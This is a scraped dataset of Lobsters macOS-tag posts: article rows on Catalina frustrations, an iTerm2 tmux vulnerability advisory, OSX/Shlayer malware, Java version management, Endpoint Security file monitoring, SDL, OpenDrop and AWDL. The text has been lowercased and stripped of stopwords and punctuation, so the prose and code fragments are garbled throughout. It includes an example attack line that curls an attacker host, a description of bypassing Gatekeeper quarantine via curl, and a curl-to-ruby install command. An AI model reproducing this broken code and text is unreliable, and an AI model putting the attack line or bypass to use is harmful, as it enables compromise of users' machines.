permission moment ago run slightly different way catalina decides lock decided macos fix googling failed far next idiot reason python daemon launch root via launchd remains running background silently failing nt allowed access external usb drive oh debugging applescript example paragraph every time saved cron change vim system would throw dialog asking permission allow terminal modify know personal crontab explicitly invoked editing session although pretty sure also thing mojave point still stand guess apple trying protect lesstechnical customer might inadvertently install malicious recurring background process root accidentally read file external volume running shell script nontechnical user opened terminal edited made executable invoked suppose attack vector icloud password shenanigan upgrading catalina like basically every recent macos release found logged icloud facebook gmail never life expired session purpose since icloud data stored encrypted nonremovable hard drive protected chip biometric security see best apple log every time install software update ok fine log back course icloud reject password system preference many time eventually lock force forgot password flow change password back always done finally logged back io device start beeping find expected given logged new device imac hostname duplicated reason sure local account password shenanigan catalina upgrade spending time getting apps setting etc kind back normal wife tried login account imac everything went fine got software updated mac went sleep local mac account password simple alllowercase english word without space number special character macos would nt accept tried login would nt accept typed decided keyboard must somehow malfunctioned last half hour thought extremely clever trying login via remote screen sharing session failed well hour ago problem persists multiple restarts nt right try debug worried data backed ready blow away account create new one apple photosapp took around eight hour photosapp upgrade icloud photo library first time opened catalina since across multiple reboots simply refuse update new photo added icloud device upload new photo icloud imported directly machine say updating forever little thing found earlier today could nt restart mac application still running thing open idle xcode quick discovered idea system preference even running nt visible dock mentioned earlier sign icloud time upgrading day later popped using textmate upgrading catalina macos made reauthorize every app wanted send notification ironically following alert appears every time reboot despite always dismissing using definitive option apple provides never giving whateverprocessisshowingit permission notify anything first place anyway love mac everything software hardware stand imac pro new mac mini phenomenal revamped mac pro six year really damn beast honestly nt even mind usbc keyboard literally hundred thousand predatory scam mac app store whatever fuck going messagesapp macos icloud drive boneheaded arrogant literallyputontheconsumerfacingmarketingwebsite claim ipadtomac catalyst merely checkbox dumb stupid little bug mentioned truckload papercuts sure run catalina hour god absolutely clear mac far outside upperranks apple focusing trying throw engineering bus friend many wonderful talented hardworking caring apple developer want mac fucking thrive explicitly shitting management blaming executive team allowing ship
148,Lobsters,mac,Apple macOS,By the numbers: ZFS Performance Results from Six Operating Systems and Their Derivatives,https://www.youtube.com/watch?v=HrUvjocWopI,number zfs performance result six operating system derivative,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature number zfs performance result six operating system derivative youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature number zfs performance result six operating system derivative youtube
149,Lobsters,mac,Apple macOS,Critical Security Issue identified in iTerm2 as part of Mozilla Open Source Audit,https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/,critical security issue identified part mozilla open source audit,mozilla open source support program radically open security published concurrent heartbleed vulnerability moss website,security audit funded mozilla open source support program moss discovered critical security vulnerability widely used macos terminal emulator finding vulnerability mozilla radically open security ro firm conducted audit developer george nachman worked closely together develop release patch ensure user longer subject security threat user update immediately latest version published concurrent blog post founded moss broadens access increase security empowers user providing catalytic support open source technologist track iii moss created wake heartbleed vulnerability support security audit widely used open source technology like mozilla open source company funding moss provides one key way continue ensure open source ecosystem healthy secure one popular terminal emulator world frequently used developer moss selected security audit process untrusted data widely used including highrisk target like developer system administrator audit ro identified critical vulnerability tmux integration feature vulnerability present least year attacker produce output terminal many case execute command user computer example attack vector would connecting attackercontrolled ssh server command like curl http attackercom tail f expect community find many creative example proofofconcept video command run mock victim machine connecting malicious ssh server case calculator opened placeholder nefarious command typically vulnerability would require degree user interaction trickery exploited via command generally considered safe high degree concern potential impact update available mitigation issue assigned eventually prompt update automatically recommend proactively update going menu choosing check fix available version prior update published earlier week contain fix like apply funding audit moss find application link moss website
150,Lobsters,mac,Apple macOS,macOS 10.15 Vista,https://tyler.io/macos-10-15-vista/,macos vista,catalina another update read instead update four hour later escalated quickly dumb joke,completely realize wholeheartedly ownup fact geek mac power user beyond normal muggles ever experience nonetheless firstrun experience greeted afternoon upgrading catalina another update hour later ignore original update go read instead update four hour later well escalated quickly twitter twelve year course two biggest tweet would making dumb joke dunking apple anyway screenshot deserves full explanation first accurate took upgrading existing mojave system catalina afternoon installer finished worked way usual postinstallation promptswindowswhatever left took son go get flu shot glamorous life father came back forty minute later basically screen looked thought mildly funny began arranging permission dialog nt overlap xxxx would like show notification prompt appeared took another screenshot soon realized like nearly every macos update logged icloud meant time screenshot yet spent ten minute system today enough time capture papercuts combine one trulyawful über screenshot want make clear blaming talented apple engineer obviously worked butt catalina like every release sideeye squarely directed manager marketer push insane release cycle also executive shiny new mac pro xdr display damned obviously nt see mac priority longer laptop keyboard mac app store insane new focus service clear higherups favorite fruit company nt give shit longer angry sad
151,Lobsters,mac,Apple macOS,macOS Catalina,https://www.apple.com/macos/catalina/,macos catalina,,experience voice control film transcript ian us dictation voice control wake music play level reading gray white microphoneshaped dictation icon move ian voice ian dictating voice control breakthrough feature give full control device comma voice period text ian dictation appears note ian dictating whole new way everything love period like correct love word love highlighted blue list numbered option appears word option include replacement word well heart icon ian us voice control sixteen red heart icon replaces word love text cut interior ian house sits motorized wheelchair front imac ian us voice control open photo photo open dock day folder show may photo ian wheelchair riding along roadside friend bike ian us voice control scroll day april photo man mountain bike treecovered mountain edge lake ian us voice control show number number appear folder button photo ian us voice control thirteen photo open man hold mountain bike head front lake ian us voice control click share dialog box open share photo numbered list option ian us voice control three message open photo appears message ian us voice control tim name tim appears field autofills timabad icloudcom ian us voice control next field let ride one today thumb emoji text appears message along thumb emoji ian us voice control click send open map map open ian us voice control show grid map pacific coast scenic byway overlaid numbered grid ian us voice control long press twenty pin drop tag marked location olympic national park highway port angeles info icon ian us voice control open app switcher ian glance wheelchairmounted iphone notification popsup map ian imac number four appears top left notification ian us voice control four marked location open map ian iphone ian us voice control tap share ian contact tim highlighted message logo bottom photo ian us voice control tap tim marked location appears message tim responded initial message let go ian us voice control tap send send button numbered selected music play jump atomic drum assembly cut wide shot ian ride motorized wheelchair across pedestrian bridge river camera follows behind ride toward evergreen forest cut ian us sip puff controller ride along forest trail tim ride next two men smile ian talk tim hey good see cut tim ian reach shore lake ringed green hill look water ian us voice control open music turn volume ian speaks alright zoom hill white cloud fill sky white apple logo appears front cloud
152,Lobsters,mac,Apple macOS,macOS bug breaks WiFi MAC address change on new MacBooks,https://slashdot.org/submission/10504880/macos-no-longer-allows-changing-wifi-mac-address,macos bug break wifi mac address change new macbooks,slashdot apparel back shop tool improvement linkedin,slashdot apparel back shop develop github keep using github automatically sync github release sourceforge quickly easily tool take advantage sourceforge massive reach check sourceforge improvement follow slashdot linkedin
154,Lobsters,mac,Apple macOS,OSX/Shlayer new Shurprise.. unveiling OSX/Tarmac,https://blog.confiant.com/osx-shlayer-new-shurprise-unveiling-osx-tarmac-f965a32de887,osxshlayer new shurprise unveiling osxtarmac,discovered magnet link codesign vvv fajar budiarto quarantine attribute user consent popup curl curl,macos malware becoming serious threat mac user cyber criminal apt group nation state actor extensively targeting apple iosmacos device various reason continuous innovation development apple platform lead ultimately new attack surface sold underground weak malware builtin security feature macos ship gatekeeper xprotect protection bypassed new malware finally apple device trendy sometimes considered wealth indicator simply becoming useful million people everyday life little thing might convince threat actor look apple device include scope targetsosxshlayer common macos malware year time delivered bad ad first discovered osxshlayer came via fake flash player updater appearing bittorrent file sharing website user attempt select link copy torrent magnet linktoday osxshlayer still delivered bad ad thanks confiant realtime malvertising tracking platform stumbled upon malicious advertiser redirects victim matching certain criterion coming certain country using macos computer following landing page offering yet another fake adobe flash player update landing page showing fake flash update delivering osxshlayerdan apple disc image file adobeflashplayerinstallerdmg downloaded following hash installer icon genuine adobe flash player installer fake adobe flash player installer delivering osxshlayerdof course real adobe flash player installer one way confirm check adobe signature using macos command codesign vvvindeed official adobe installer fake flash player installer signed using apple developer certificate issued probably fake identity named fajar budiartosigning malware apple developer certificate easy became standard practice macos malware developer one reason gatekeeper xprotect failing stop malware signed even though fake identity apple developer certificate still signed apple thus malware allowed run preliminary check since file downloaded safari quarantine aware browserapplication like chromeapp mailapp extended attribute added file hfsapfs file system especially quarantine attribute attribute essential gatekeeperxprotect kick start magic analyze malware go well user consent popup shown warning user running file file turn malicious option remove file shownthe problem macos application quarantine aware curl one good exampleso happens malware downloaded quarantine aware application like curl command line extended quarantine attribute set malware none gatekeeper xprotect kick user consent popup shown malware execute would total bypass macos builtin malware security feature fact exactly osxshlayer use launch osxtarmac administrator privilege
155,Lobsters,mac,Apple macOS,Working with multiple Java versions in MacOS,https://medium.com/@brunofrascino/working-with-multiple-java-versions-in-macos-9a9c4f15615a,working multiple java version macos,working multiple java version macos first step let brew http rawgithubusercontentcomhomebrewinstallmasterinstall http brewsh tool got utility belt http wwwjenvbe jdk http sdkmanio http githubcomshyikojabba final step,working multiple java version macosas might know oracle decided make money jdk two option basically oracle jdk lts long term support released every year requires commercial license openjdk free bug fix security patch every month upgrade itthe latest jdk release time writing article jdk recent year java changed lot feature deprecated package even removed jdk might feel need test new feature migrate old project might find cumbersome set java environment every time want try different jdk let see make process easierfirst step let brew know homebrew according webpage homebrew missing package manager macos homebrew installs stuff need apple boldso easy install paste following terminal prompt usrbinruby e curl fssl http rawgithubusercontentcomhomebrewinstallmasterinstall going use extension cask homebrew make even easier install application mac according website homebrew cask extends homebrew brings elegance simplicity speed o x application large binary alikeit take line shell reach cask maintained contributor great prompt brew tap caskroomcaskthis command automatically update homebrew installing casknow free macos package manager installed yey detail check homebrew web page http brewsh next tool got utility belt idea install multiple java version want able switch one another easily course manually open browser find website find right link wait download complete set would want right let make life easier use another tool imagine switching version one command imagined great great tool called jenv applause according jenv web site http wwwjenvbe jenv command line tool help forget set javahome environment variable ooh tempting guess install jenv yes great free package manager homebrew terminal prompt brew install jenvwhat jdk great well equipped right tool install jdks way option tool proposing look interested look sdkman http sdkmanio jabba http githubcomshyikojabba let use homebrew hard work homebrew install java u since october openjdk version instead oracle jdk installed homebrewwhat difference might know oracle discontinue old java version mean bug security fix available even suggest remove old version oracle started version lts long term support version jdk going need licence want use openjdk free opensource implementation java platform standard edition official reference implementation java se since version since jdk effort produce opensource reference implementation java se platform moved jdk project project keep user updated releasing new feature every six month say thing get dynamiconce homebrew install openjdk version javaat terminal prompt install latest version brew cask install javafor older version specify one want example brew cask install cask install different java version machinefinal steplet solve hide seek sort problem basically need tell jenv jdk version want manage find running following terminal usrlibexecjavahome vyou see something like matching java virtual machine openjdk java se java se see version detail respective locationgreat let add jenv yey might want close open new terminal prompt jenv completely installed try add library jenv get message saying file directory reason got fresh new terminal prompt add library want jenv add jdkpath case example run jenv add add add added jenv different version jdk check version jenv managing prompt jenv versionsyou might get something like system set usersbrunofrascinodocumentsprojectsplayjavaversion seems jenv already found java installation note duplicity version remove one need time using jenv command remove jenv remove remove java installation link jenvnice use basically call defining scope jenv scope jdkversion say many project computer need maintain different version java set global java version example jenv global java rule check java version java versionjava version java tm se runtime environment build java hotspot tm server vm build mixed mode nice clean need different version jenv global need another version another version right switch version time need work different java version project could need jenv allows set local environment mean example folder inside folder working say java switch folder working say jenv allows setting local scope example cd local cd local every time inside folder using java inside folder using java inside folder local java version setting using version set globally flexible nice clean remember check version use java command java versionthat able manage different java environment macos run old java legacy system also switch new bleeding edge new one command added flexibility agility development environment enjoy
156,Lobsters,mac,Apple macOS,Writing a File Monitor with Apple's Endpoint Security Framework,https://objective-see.com/blog/blog_0x48.html,writing file monitor apple endpoint security framework,visit jamfcom background writing process monitor apple endpoint security framework online post ransomwhere blockblock trust pid post apple endpoint security framework post link post documentation post post file monitor library conclusion patreon,writing file monitor apple endpoint security framework patrick wardle september research tool writing supported friend objectivesee today blog post brought visit jamfcom filemonitor starting file monitor ok file create eseventtypenotifycreate source path null destination path privatetmptest process pid path usrbintouch uid signing info cdhash csflags isplatforbinary signatureidentifier comappletouch filemonitorapp background earlier week posted blog titled writing process monitor apple endpoint security framework post rather thoroughly discussed new frameworksubsystem introduced macos catalina endpoint security moreover detailed exactly build comprehensive usermode process monitor leveraged new framework posted fullsource online blog post assumes read previous post solid understanding new endpoint security framework covering foundational detail endpoint security frameworksubsystem common component many security tool file monitor name implies file monitor watch file io event plus generally extract information process responsible said file event many objectivesee tool contain file monitor component track file event example include ransomwhere track file creation detect rapid creation encrypted file untrusted process read ransomware blockblock track file creation modification order detect alert persistence event malware installation preferred way programmatically create file monitor usermode subscribe event fsevents character device devfsevents devfsevents ordonly though directly reading file event devfsevents sufficient say provides notification file event includes pid responsible process suffers various drawback limitation first apple actually discourages use noted bsdvfsvfsfseventsc file strncmp watcher procname fseventsd sizeof watcher procname strncmp watcher procname coreservicesd sizeof watcher procname strncmp watcher procname md sizeof watcher procname watcher flag watcherapplesystemservice else printf fsevents watcher pid using devfsevents directly unsupported migrate fseventsframeworkn watcher procname watcher pid second rather painful programmatically interface requires one parse tokenize various binary file event args get next event struct nsstring unsigned char ptrbuffer currentoffsetptr int ptrcurrentoffset path nsstring path nil int arglen unsigned short arglen unsigned short argtype struct kfseventa fse struct kfseventarg fsearg fse struct kfseventa unsigned char unsigned char ptrbuffer ptrcurrentoffset handle dropped event fse type fseeventsdropped err msg logmsg logerr filesystem event dropped kernel advance next ptrcurrentoffset sizeof kfseventa sizeof fse type exit early return nil ptrcurrentoffset sizeof struct kfseventa fsearg struct kfseventarg ptrbuffer ptrcurrentoffset save path path nsstring fsearg data skip path ptrcurrentoffset sizeof kfseventarg fsearg pathlen argtype unsigned short unsigned char unsigned char ptrbuffer ptrcurrentoffset arglen unsigned short ptrbuffer ptrcurrentoffset argtype fseargdone arglen arglen arglen ptrcurrentoffset arglen finally problematic though file event delivered via devfsevents contain information process responsible generating file event struct kfseventa information simply process identifier pid struct kfseventa type refcount pidt pid kfseventa building comprehensive file monitor especially part security tool one generally requires information responsible process path codesigning information generating codesigning process via pid somewhat nontrivial may also rather computationally cpu intensive although exist apis procpidpath generate comprehensive process information solely pid apis unsurprisingly fail process already terminated inherent delay file event delivered via devfsevents actually uncommon think malware installers simply persist binary quickly exit worse pid reused one may actually misidentify process generated file event security product rather unacceptable issue pid see trust pid also possible receive file io event via openbsm subsystem however limitation approach well highlighted previous blog post way realize truly effective file monitor via code running kernel apple endpoint security framework apple push kick developer including security product kernel coupled realization finally existing subsystem rather archaic dated apple recently announced new usermode endpoint security framework provides usermode interface new endpoint security subsystem see framework address many aforementioned issue shortcoming specifically provides welldefined relatively simple api comprehensive process including codesigning information event ability proactively respond file event though file monitor passive often somewhat critical apple security posture lack thereof however endpoint security framework potentially gamechanger u seeking write robust usermode security tool macos mahalo apple personally stoked blog practical walkthru creating file monitor leverage apple new framework information endpoint security framework see apple developer documentation blog illustrate exactly create comprehensive usermode file monitor leverage apple new framework noted previous blog post prerequisite leverage endpoint security framework include comappledeveloperendpointsecurityclient entitlement requested apple via link still waiting give entitlement ie app productname entitlement file disable sip remains pseudounenforced dict key comappledeveloperendpointsecurityclient key true dict xcode sdk still beta recommended perform development virtual machine running macos beta macos catalina appears endpoint security framework made available older version macos tool leverage framework run newer ok enough chitchat let dive goal simple create comprehensive usermode file monitor leverage apple new endpoint security framework besides capturing file io event also interested type event create write etc path file possibly source destination process responsible event including unlike reading event devfsevents new endpoint security framework make breeze noted previous blog post order subscribe event endpoint security subsystem must first create new endpoint security client esnewclient function provides interface perform action code first include endpointsecurityh file declare global variable type esclientt invoke esnewclient function import endpointsecurityendpointsecurityh global endpoint client endpointclient nil client callback invokes user callback new process endpointclient esclientt client const esmessaget message process event note esnewclient function take pointer variable type esclientt function return variable hold initialized endpoint security client required endpoint security apis second parameter esnewclient function block automatically invoked endpoint security event shortly well esnewclient function return esnewclientresultsuccess indicating created newly initialized endpoint security client esclientt u use compile code link endpoint security framework libendpointsecurity created instance esnewclient must tell endpoint security subsystem event interested want subscribe apple parlance accomplished via essubscribe function documented esclienth header file function take initialized endpoint client returned esnewclient function array event interest size said array process event interest event eseventtypenotifycreate eseventtypenotifywrite event esreturnsuccess essubscribe endpointclient event sizeof event sizeof event err msg nslog error essubscribe failed bail goto bail event interest depends well event interest writing file monitor interested filerelated event eseventtypenotifycreate type represents file creation notification event eseventtypenotifyopen type represents file opening notification event eseventtypenotifywrite type represents file writing notification event eseventtypenotifyclose type represents file closing notification event eseventtypenotifyrename type represents file renaming notification event eseventtypenotifylink type represents link creation notification event eseventtypenotifyunlink type represents link unlinking notification event see apple documentation event type eseventtypet enumeration essubscribe function successfully return esreturnsuccess endpoint security subsystem start delivering message read file event recall final argument esnewclient function callback block handler apple state handler run message sent client block invoked endpoint client importantly message endpoint security subsystem message variable pointer type esmessaget ie esmessaget notable member esmessaget include esprocesst process pointer structure describes process responsible file event eseventtypet eventtype type event match one event subscribed eg eseventtypenotifycreate eventtype event event specific structure ie eseventcreatet though event member message structure message event event specific file event largely example compare eseventwritet eseventcreatet structure le typedef struct esfilet nullable target reserved eseventwritet typedef struct esfilet nullable target reserved eseventcreatet contain pointer esfilet structure contains path file created written etc le esfilet provides inodedevno path file relates security event path may truncated indicated pathtruncated flag typedef struct esstringtokent path bool pathtruncated union devt devno fsidt fsid inode esfilet note however file event eseventrenamet event involve source destination file typedef struct esfilet nullable source esdestinationtypet destinationtype union esfilet nullable existingfile struct esfilet nullable dir esstringtokent filename newpath destination reserved eseventrenamet file event message also contain pointer esprocesst structure message process responsible process ie generated file event detailed previous post structure contains full process information including pid path codesigning information point stoked receiving file event along full detail responsible process worrying pid lookup failing returning incorrect process let look illustrate code first esnewclient message callback instantiate custom file object passing received esmessaget message client callback invoked file event endpointclient esclientt client const esmessaget message new file obj file file nil init file obj file file alloc init esmessaget nonnull message nil file invoke user callback callback file custom file object init method simply par relevant information esprocesst structure process id path codesigning information detailed previous post extract file path process process alloc init message path logic specific event self extractpaths message extractpaths method contains event specific logic recall file event contain source destination path source destination path requires event specific logic void extractpaths esmessaget message event specific logic switch message eventtype create case eseventtypenotifycreate selfdestinationpath convertstringtoken message eventcreatetarget path break write case eseventtypenotifywrite selfdestinationpath convertstringtoken message eventwritetarget path break rename case eseventtypenotifyrename set src path selfsourcepath convertstringtoken message eventrenamesource path existing file esdestinationtypeexistingfile esdestinationtypeexistingfile message eventrenamedestinationtype set dest file selfdestinationpath convertstringtoken message eventrenamedestinationexistingfile path new path esdestinationtypenewpath else set dest path combine dest dir dest file selfdestinationpath convertstringtoken message eventrenamedestinationnewpathdir path stringbyappendingpathcomponent convertstringtoken message eventrenamedestinationnewpathfilename break return file object init method return comprehensive fully parsed representation reported file event file monitor library noted several objectivesee tool track file event currently via inefficient antiquated mean lucky u shown blog leverage apple endpoint security subsystem effectively comprehensively monitor file event usermode today releasing opensource file monitoring library implement everything discussed today fairly simple leverage library noncommercial tool build library libfilemonitora add library header file filemonitorh project import filemonitorh shown also link libbsm audittokentopid libendpointsecurity library add comappledeveloperendpointsecurityclient entitlement project productname entitlement file write code interface library final step involves instantiating filemonitor object invoking start method passing callback block invoked file event sample code implement logic monitor filemon filemonitor alloc init block automatically invoked upon file event block file file switch fileevent create case eseventtypenotifycreate nslog file create eseventtypenotifycreate break write case eseventtypenotifywrite nslog file write eseventtypenotifywrite break print info nslog file monitoring pas block event filemon start block loop nt want exit nsrunloop currentrunloop run filemon start block method invoked file monitoring library automatically invoke callback block file event returning file object file object declared library header file filemonitorh object contains information file event possibly source destination path process responsible event process object take peek filemonitorh file detail compiled ready start monitoring file event example run echo objectivesee rule tmptest generates open write close file io event filemonitor starting file monitor ok file open eseventtypenotifyopen source path null destination path privatetmptest process pid path binzsh uid signing info cdhash csflags isplatforbinary signatureidentifier comapplezsh file write eseventtypenotifywrite source path null destination path privatetmptest process pid path binzsh uid signing info cdhash csflags isplatforbinary signatureidentifier comapplezsh file close eseventtypenotifyclose source path null destination path privatetmptest process pid path binzsh uid signing info cdhash csflags isplatforbinary signatureidentifier comapplezsh conclusion previously writing usermode file monitor macos trivial task thanks apple new endpoint security frameworksubsystem macos breeze short one simply invokes esnewclient essubscribe function subscribe event interest recalling comappledeveloperendpointsecurityclient entitlement required file monitor illustrated subscribe filerelated event eseventtypenotifycreate eseventtypenotifyopen eseventtypenotifywrite showed extract relevant file responsible process structure parse relevant metadata finally discussed opensource file monitoring library implement everything discussed today love blog post andor want support research tool support via patreon page
157,Lobsters,mac,Apple macOS,"Apple Special Event for September 10th, 2019",https://www.apple.com/apple-events/livestream/,apple special event september,,watchos watchos discover custom watch face website social medium share face friend also meet sleep app dream track fitness metric four new workout create healthier habit new handwashing feature see preview
158,Lobsters,mac,Apple macOS,I'm working on a live shader editor for Metal,https://github.com/catilac/PsychOut,working live shader editor metal,join github today sign file permalink psychout screenshot phase one todo phase two resource license reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time psychout edit metal shaders real time currently support editing compute shader screenshot phase one todo phase two live coding tool resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
159,Lobsters,mac,Apple macOS,Open source smart file comparison tool,https://github.com/madushadhanushka/differ,open source smart file comparison tool,differ differ structural comparison supported file type build setup download incase failure,differ smart file comparison tool electron based application compare file two directory additianal nomal file comparison tool also provide support compare two xml property json file change whithout considering structural position online version available differ structural comparison supported file type xml json property build setup install dependency npm install serve hot reload npm run dev build electron app production npm run build lint jsvue component file appsrc npm run lint run webpack production npm run pack download download latest binary distribution relavant platform incase failure please makesure set execution permission linux already set chmod x differ already install electron machine need lib file included zipped folder run application face problem using application please raise issue github issue
160,Lobsters,mac,Apple macOS,SDL on classic Mac OS,https://nondisplayable.ca/2017/12/20/sdl-on-classic-mac.html,sdl classic mac o,fantastic sdl library sdl release directory set project wikipedia page write simple sdl c program gotchas crash unknown instruction error type program exit sdlkunknown virtual key code returned still come,fun decided see could write something graphical older mac o looking option seemed like writing direct macintosh toolbox code would take long get speed searched bit found older ppc mac o port fantastic sdl library got lot experience trick sdl especially obscure platform getting toolchain work often sparse documentation got something simple building power macintosh running mac o o year old installed codewarrior pro mpw well decided since also wanted learn codewarrior worked selected following option done full install machine hard drive filled stuff c compiler fat ppc c compiler find library point download extract sdl release used available sdl release directory reason probably guess recent release sdl release sdl classic mac o file got library source code package set project codewarrior created new project file chose cc macos ppc target far know release sdl support fat target unnecessary similar visual studio handle project file codewarrior ton extra compiler option defined perproject next step navigate project preference following thing point codewarrior path include directory sdl install unpacked set preferred minimum heap size application kb initially ended problem sdlsetvideomode silently failed probably default heap size enough room buffer classic mac o application prerequest heap mechanism usually way dynamically request memory runtime read wikipedia page chance originally owned older mac already experienced pain manually tweaking application memory size get program behave close project preference saving add sdl sdlmainppclib file mac library section codewarrior project find sdl stuff unpacked finder copy sdl library file folder contains project file otherwise application building find startup start also place file somewhere global sake keeping machine pure add sdlrsrc resource file resource section codewarrior project window provides resource dialogue box icon menu etc sdl application building need write simple sdl c program experience sdl able write pretty easily something like get started int sdlmain int argc char argv note sdlmain main sdlsurface screen orange key sdlevent event sdlinit sdliniteverything exittoshell return screen sdlsetvideomode sdlanyformat sdldoublebuf screen nt initialize maybe memory see exittoshell return orange sdlmaprgb screen format sdlwmsetcaption hello sdl true sdlfillrect screen null orange sdlpollevent event event nt seem work see need poll event otherwise app lock machine eventtype sdlquit break keycodes sdlgetkeystate null keycodes sdlkescape break sdlflip screen sdldelay return able run program without debugger noticed gotchas yet know solve see gotchas crash unknown instruction error type program exit sure causing looking codewarrior debugger seems like trying execute invalidunknown opcodes postexit file close code look since lock machine experimenting sdlkunknown virtual key code returned handling keydown event usually write something like sdlpollevent event eventtype sdlkeydown eventkeykeysymsym sdlkescape bail shouldquit true key event type whatever reason distribution sdl perhaps machine keysymsym always set sdlkunknown matter key hit workaround see used sdlgetkeystate seem correct mapping virtual key real key set key hit keysymscancode seems set properly may want using direct physical scancodes instead virtual key look since pretty annoying still come know create alert dialogue box instance tell user sdl could initialized screen surface could created quitting based code seen internet inside macintosh something like work paramtext poh something wrong p p p stopalert null id dlog sdlrsrc contains nothing appears happen application proceeds call never made passiveaggressive action usually macintosh toolbox express displeasure guessing calling incorrectly would also nice custom menu close button window send quit event app make work like actual mac application might come back write macifying sdl game future
161,Lobsters,mac,Apple macOS,OpenDrop: an Open Source AirDrop Implementation,https://github.com/seemoo-lab/opendrop,opendrop open source airdrop implementation,opendrop open source airdrop implementation applesigned certificate disclaimer open wireless link requirement apple wireless direct link owl library openssl libarchive homebrew installation release usage sending file receiving file current limitationstodos apple root paper billion open interface eve mallory mitm do tracking attack io macos apple wireless direct link link author milan stute email web alexander heinrich license gnu general public license,opendrop open source airdrop implementation opendrop commandline tool allows sharing file device directly wifi unique feature protocolcompatible apple airdrop allows share file apple device running io macos currently probably also foreseeable future opendrop support sending apple device discoverable everybody default contact mode requires applesigned certificate disclaimer opendrop experimental software result reverse engineering effort open wireless link project therefore support feature airdrop might incompatible future airdrop version opendrop affiliated endorsed apple inc use code risk requirement achieve compatibility apple airdrop opendrop requires target platform support specific wifi link layer addition requires python well several library apple wireless direct link airdrop exclusively run apple wireless direct link awdl opendrop supported macos linux system running open reimplementation awdl owl library opendrop relies current version openssl libarchive macos ship rather old version two need install newer version example via homebrew brew install libarchive openssl opendrop automatically set dyldlibrarypath look homebrew version may need update variable install library differently linux distribution ship uptodate version wo nt necessary installation installation python package release straightforward using install opendrop also install current development version first cloning repository installing via git clone http githubcomseemoolabopendropgit install opendrop usage briefly explain send receive file using opendrop see command line option run opendrop h sending file sending file typically twostep procedure first discover device proximity using find command stop process found receiver opendrop find looking receiver press enter stop found index id name john iphone found index id name jane macbook pro send file using opendrop send r f pathtosomefile asking receiver accept receiver accepted uploading file uploading successful instead index also use id name opendrop try interpret input order index id name fail match found receiving file receiving much easier simply use receive command opendrop accept incoming file automatically put received file current directory opendrop receive current limitationstodos opendrop result research project thus several limitation nonexhaustive list capacity work happy provide assistance somebody else want take triggering macosios receiver via bluetooth low energy apple device start awdl interface airdrop server receiving custom advertisement via bluetooth le see usenix paper detail mean apple airdrop receiver may discovered even discoverable everyone senderreceiver authentication connection state currently peer authentication apple airdrop particular opendrop verify tl certificate signed apple root apple id validation record correct see usenix paper detail addition opendrop automatically accepts file receives due missing connection state sending multiple file apple airdrop support sending multiple file opendrop would require adding file archive modify http ask request etc paper milan stute sashank narain alex mariotto alexander heinrich david kreitschmann guevara noubir matthias hollick billion open interface eve mallory mitm do tracking attack io macos apple wireless direct link usenix security symposium usenix security august santa clara ca usa link author milan stute email web alexander heinrich license opendrop licensed gnu general public license
162,Lobsters,mac,Apple macOS,Meshing using Apple Wireless Direct Link (AWDL),https://yggdrasil-network.github.io/2019/08/19/awdl.html,meshing using apple wireless direct link awdl,meshing using apple wireless direct link awdl wireless without border hacker news thread opendrop owl science found paper mesh opportunity getting started waking awdl peering automatically observation io conclusion matrix channel,meshing using apple wireless direct link awdl august neil alexander wireless without border mostly prompted write post response hacker news thread recently announced release opensource airdrop implementation called opendrop team seemoo lab produced opensource implementation apple wireless direct link awdl protocol called owl awdl secret sauce behind airdrop peertopeer airplay apple wireless technology even though everything covered post done time ago never spent time document exception wireless network world operate infrastructure mode wireless access point serf one wireless client think wifi home work coffee shop however implied name reliable usable infrastructure wifi often available certain physical location good infrastructure wanted connect device together anywhere served infrastructure wifi network location suddenly plug wireless access point may many option bluetooth aside awdl designed avoid problem extending wireless standard allow client device communicate directly without help central wireless access point walk field couple iphones mac use awdl discover exchange data peertopeer even better nearby device connected different infrastructure wifi network still communicate using awdl science normally connected wireless access point wireless client remain locked specific radio channel ap using awdl work instructing wireless adapter device hop channel remain connected wireless access point also listen nearby device device announce presence information service social channel device hear effectively creating peertopeer service discovery two device decided want communicate directly agree jump another channel real data exchange interrupt existing wifi network indeed social channel hop wireless channel happen quickly little disruption user wifi connection already except minor wireless performance degradation covered later number paper published owlink team inner working awdl protocol found particular paper mobicom contains significant amount detail awdl protocol channel hopping technique security consideration amongst thing mesh opportunity yggdrasil designed create mesh network automatically interconnected node idea node route node mesh network routing node today many connection happen node across internet since community still relatively small geographically dispersed node joining yggdrasil network need peer single device already connected wider network order participate fullyroutable mesh however goal yggdrasil remain something toy internet want build protocol scale globally work adhoc even place infrastructure might particularly strong otherwise think one yggdrasil greatest strength close zeroconfiguration beyond giving small number configuration option scale well principle yggdrasil already discover potential peer network segment using multicast service discovery sound lot like awdl social channel configure interface yggdrasil beacon multicastinterfaces configuration directive wanted know could blend two yggdrasil could automatically discover nearby device initiate peering connection using awdl getting started mac good target developing testing awdlaware application awdl exposed userspace network adapter called sits linklocal address run tcpdump wireshark listen awdl traffic even ping multicast group address interface get response nearby device eg using however apple device always keep awdl alive listening time macos awdl driver woken either airdrop actively used finder netservice created usually objectivec swift request peertopeer networking awdl normally kept alive long enough satisfy connectivity session sent back sleep period idleness io story somewhat similar except awdl often woken soon device unlocked airdrop enabled netservice api otherwise function way tvos outlier seems wake listen awdl randomly even device otherwise asleep presumably advertising ability receive incoming airplay session nearby device user perspective interface look entirely unremarkable behaves largely like ethernet interface carrying regular traffic background bit complicated awdl driver performs traffic filtering security reason namely stop someone sat next airport browsing file share regular listening socket accept connection awdl unless specific socket option configured socket started listening multicast traffic however largely get passed filter untouched bingo waking awdl netservice api effectively wrapper around multicast dnssd apple colourful language affectionately known bonjour api added benefit able tell operating system wake awdl driver pretty much demand behalf peertopeer service would need wake awdl call netservice api publish service request peertopeer functionality let operating system hard work u yggdrasil written go concept netservice thankfully able use cgo instead wrote cgo function call netservice api advertises new fake service yggdrasiltcp cause operating system wake awdl driver amazingly worked yggdrasil actually use dnssd currently use customformatted multicast beacon different multicast group planned eventually migrate something standard like dnssd service discovery however instance registering fake dnssd service enough wake awdl peering automatically driver active regular yggdrasil multicast beacon multicast group address seem passed driver normally yggdrasil node running machine start hear call thing remained done configure socket aforementioned socket option allow communicate awdl interface socket option called sorecvanyif defined syssocketh darwin configure socket option tcp peering socket err unixsetsockoptint int fd syscallsolsocket err nil yggdrasil node hear advertisement interface regular automatic peering process kick tcp session 